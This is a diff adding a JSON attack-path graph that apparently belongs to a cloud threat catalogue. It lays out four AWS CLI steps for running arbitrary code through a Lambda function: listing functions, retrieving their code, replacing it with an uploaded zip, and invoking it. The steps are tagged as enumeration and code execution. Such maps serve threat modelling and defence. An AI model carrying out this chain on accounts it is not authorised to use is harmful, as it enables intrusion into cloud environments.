@@ -1,0 +1,60 @@
+{
+    "title": "Exploit Lambda Function to Run Arbitrary Code",
+    "icon": "https://img.icons8.com/?size=100&id=32380&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "List Lambda Functions",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/list.png",
+            "details": {
+                "command": "aws lambda list-functions",
+                "description": "Lists all Lambda functions in the specified region.",
+                "services": ["Lambda"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/lambda/list-functions.html"
+            }
+        },
+        {
+            "id": 3,
+            "label": "Get Lambda Function Code",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/code.png",
+            "details": {
+                "command": "aws lambda get-function --function-name <FunctionName>",
+                "description": "Retrieves the code of the specified Lambda function.",
+                "services": ["Lambda"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/lambda/get-function.html"
+            }
+        },
+        {
+            "id": 4,
+            "label": "Modify Lambda Function Code",
+            "icon": "https://img.icons8.com/?size=100&id=xhknQqIu8ljv&format=png&color=000000",
+            "details": {
+                "command": "aws lambda update-function-code --function-name <FunctionName> --zip-file fileb://<PathToZipFile>",
+                "description": "Modifies the code of the specified Lambda function to run arbitrary code.",
+                "services": ["Lambda"],
+                "attack_types": ["Code Execution"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/lambda/update-function-code.html"
+            }
+        },
+        {
+            "id": 5,
+            "label": "Invoke Lambda Function",
+            "icon": "https://img.icons8.com/?size=100&id=7758&format=png&color=000000",
+            "details": {
+                "command": "aws lambda invoke --function-name <FunctionName> out.txt",
+                "description": "Invokes the Lambda function to execute the modified code.",
+                "services": ["Lambda"],
+                "attack_types": ["Code Execution"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/lambda/invoke.html"
+            }
+        }
+    ]
+}
